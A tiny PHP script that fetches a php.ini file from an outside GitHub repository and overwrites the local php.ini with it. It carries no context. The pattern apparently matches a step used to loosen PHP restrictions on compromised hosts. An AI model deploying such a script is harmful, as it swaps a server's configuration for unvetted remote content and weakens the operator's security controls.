<?php
$file = file_get_contents('https://raw.githubusercontent.com/Salman-Al7rbi/test/master/php.ini');
file_put_contents('php.ini', $file);
?>
